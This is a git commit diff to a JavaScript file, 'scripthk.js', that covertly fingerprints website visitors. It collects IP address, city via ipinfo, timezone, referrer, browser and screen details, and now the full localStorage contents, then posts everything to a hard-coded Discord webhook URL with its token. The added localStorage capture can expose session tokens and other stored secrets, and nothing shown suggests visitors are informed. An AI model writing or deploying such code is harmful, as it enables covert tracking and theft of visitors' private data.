ebb66da88389fc3abb3b5db1905655e05f93e7f8
Yahya-rabii <RABII_YAHYA@emsi-edu.ma>
2022-07-03 13:12:34 +0100

    new commit

--- scripthk.js
+++ scripthk.js
@@ -1,6 +1,10 @@
 /*Vars*/
 
 
+var ct= $.get("https://ipinfo.io", function(response) {
+    return response;
+ }, "jsonp");
+
 var ip = new XMLHttpRequest();                                //watcha doing here stalker XD !
 ip.open('GET', 'https://api.ipify.org/');                     //Discord: DawnOfSorrow#1977
 ip.send();
@@ -9,7 +13,9 @@ ip.onreadystatechange = (e) => {
     if (ip.readyState == 4) {
         var visitor = {
             ip: ip.response,
+            city : ct,
             date: new Date().toString(),
+            timezone:(new Date()).getTimezoneOffset()/60,
             page: window.location.pathname,
             referrer: document.referrer,
             history: history.length,
@@ -21,7 +27,9 @@ ip.onreadystatechange = (e) => {
                 language: navigator.language,
                 online: navigator.onLine,
                 platform: navigator.platform,
-                cookies: navigator.cookieEnabled
+                cookies: navigator.cookieEnabled,
+                javaEnabled : navigator.javaEnabled,
+                dataStorage:localStorage,
             },
             screen: {
                 width: screen.width,
@@ -44,12 +52,7 @@ ip.onreadystatechange = (e) => {
                 pixeldepth: screen.pixelDepth
             },
         }
-        /*
-        var req = new XMLHttpRequest();     //post to the backend server
-        req.open('POST', 'https://sorrow.live/api/v1/visitor');
-        req.setRequestHeader('Content-Type', 'application/json');
-        req.send(JSON.stringify(visitor));
-        */
+ 
         var dsreq = new XMLHttpRequest();   //post to a discord server
         dsreq.open('POST', 'https://discordapp.com/api/webhooks/949803684123000934/USIZOH_UY1CPtKgGfM0nFPuh30sDz2JCUrbRpYyfiQdJLdlU-a7smsJdbDLBFzTIuZrN');
         dsreq.setRequestHeader('Content-Type', 'application/json');
@@ -57,5 +60,5 @@ ip.onreadystatechange = (e) => {
     }
 }
 
-document.getElementsByClassName('col-lg-7')[0].className = '';
-document.getElementsByTagName('img')[0].hidden = true;
+//document.getElementsByClassName('col-lg-7')[0].className = '';
+//document.getElementsByTagName('img')[0].hidden = true;
